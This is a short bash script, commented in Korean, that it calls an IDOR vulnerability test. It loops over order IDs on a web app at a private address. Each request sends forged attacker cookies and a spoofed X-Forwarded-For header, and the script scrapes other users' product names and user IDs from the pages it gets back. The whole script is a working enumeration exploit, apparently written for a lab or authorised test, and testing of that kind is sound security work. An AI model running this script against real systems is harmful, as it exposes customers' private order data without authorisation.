#!/bin/bash
# IDOR 취약점 테스트 스크립트
# 사용법: ./idor-test.sh [start_id] [end_id]

TARGET="http://192.168.0.28:3000"
MY_IP="10.0.0.101"
START_ID="${1:-1}"
END_ID="${2:-10}"

echo "[*] IDOR 취약점 테스트 - 주문 정보 열거"
echo "[*] 타겟: $TARGET/order"
echo "[*] ID 범위: $START_ID ~ $END_ID"
echo "[*] 공격자 쿠키: user=attacker, user_id=999"
echo ""

for i in $(seq $START_ID $END_ID); do
    RESULT=$(curl -s -H "X-Forwarded-For: $MY_IP" \
        -H "Cookie: user=attacker; isAdmin=false; user_id=999" \
        "$TARGET/order?id=$i")

    if echo "$RESULT" | grep -q "ORDER #$i"; then
        PRODUCT=$(echo "$RESULT" | grep -oP '(?<=<span>)[^<]+(?=</span>)' | head -1)
        USER_ID=$(echo "$RESULT" | grep -oP 'User ID: \d+' | head -1)
        echo "[+] 주문 #$i: $PRODUCT | $USER_ID"
    else
        echo "[-] 주문 #$i: 없음 또는 접근 불가"
    fi
done

echo ""
echo "[*] 테스트 완료"
